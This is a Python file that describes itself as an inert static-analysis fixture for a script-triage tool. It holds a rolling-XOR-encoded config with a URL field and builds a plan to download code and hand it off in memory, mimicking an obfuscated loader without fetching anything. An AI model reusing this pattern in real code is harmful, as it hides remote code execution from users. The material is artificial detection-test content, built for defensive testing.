#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_aa5529c2 = [71, 122, 72, 52, 71, 51, 86, 38, 85, 104, 9, 106, 27, 110, 7, 117, 16, 79, 61, 88, 53, 90, 46, 75, 103, 3, 106, 25, 105, 8, 124, 31, 119, 40, 69, 32, 77, 34, 80, 41, 85, 52, 80, 49, 65, 53, 80, 34, 31, 106, 24, 116, 24, 113, 19, 76, 33, 68, 41, 70, 52, 77, 49, 66, 54, 87, 48, 85, 10, 105, 6, 115, 29, 105, 84, 101, 25, 106, 19, 125, 9, 104, 16, 45, 65, 40, 91, 47, 112, 19, 124, 17, 97, 19, 118, 30, 123, 21, 102, 15, 96, 14, 114, 29, 127, 25, 108, 31, 124, 29, 105, 0, 111, 1, 60, 90, 53, 71, 42, 75, 63, 96, 13, 108, 28, 96, 3, 98, 16, 98, 11, 110, 28, 33, 86, 62, 91, 62, 82, 13, 108, 30, 125, 21, 124, 10, 111, 19, 100, 13, 99, 7, 104, 31, 108, 51, 80, 56, 89, 48, 94, 99, 19, 124, 11, 110, 28, 111, 7, 98, 14, 98, 61, 73, 38, 121, 9, 112, 4, 108, 3, 109, 17, 114, 19, 126, 14, 111, 6, 97, 15, 80, 57, 93, 96, 3, 98, 15, 127, 30, 119, 16, 126, 83, 49, 3, 49, 85, 96, 1, 100, 7, 54, 2, 126, 11, 121, 21, 40, 64, 52, 64, 48, 67, 121, 86, 121, 27, 41, 27, 127, 74, 43, 78, 45, 28, 40, 6, 99, 27, 122, 23, 103, 11, 110, 64, 41, 71, 49, 80, 60, 85, 49, 30, 124, 30, 124, 26, 127, 71, 33, 64, 110, 30, 103, 27, 110, 29, 120, 10, 85, 52, 83, 54, 88, 44, 17, 89, 44, 66, 54, 68, 33, 82, 33, 113, 8, 124, 20, 123, 21, 58, 88, 106, 88, 60, 9, 104, 13, 110, 95, 107]

CODEC_aa5529c2 = "integer_list|rolling_xor|31"



def load_aa5529c2():

    return bytes(MATERIAL_aa5529c2)



def decode_aa5529c2(e):

    d = bytearray()

    q = 49

    for value in e:

        d.append(value ^ q)

        q = value

    return bytes(d)



def recover_aa5529c2():

    n = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")

    s = "decode"

    while s != "done":

        if s == "decode":

            d = decode_aa5529c2(load_aa5529c2())

            s = "done"

    t = d.decode("ascii", "strict")

    return t



def inspect_aa5529c2():

    return recover_aa5529c2()



def surface_aa5529c2():

    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))



def obfuscation_aa5529c2():

    return "{left}{right}".format_map({"left": "format_", "right": "map"})



def plan_aa5529c2():

    fields = dict(item.split("=", 1) for item in inspect_aa5529c2().split("|"))

    analysis_surface = surface_aa5529c2()

    obfuscation_surface = obfuscation_aa5529c2()

    operation_plan = ("urllib_memory", fields["url"], "memory-handoff")

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_aa5529c2())

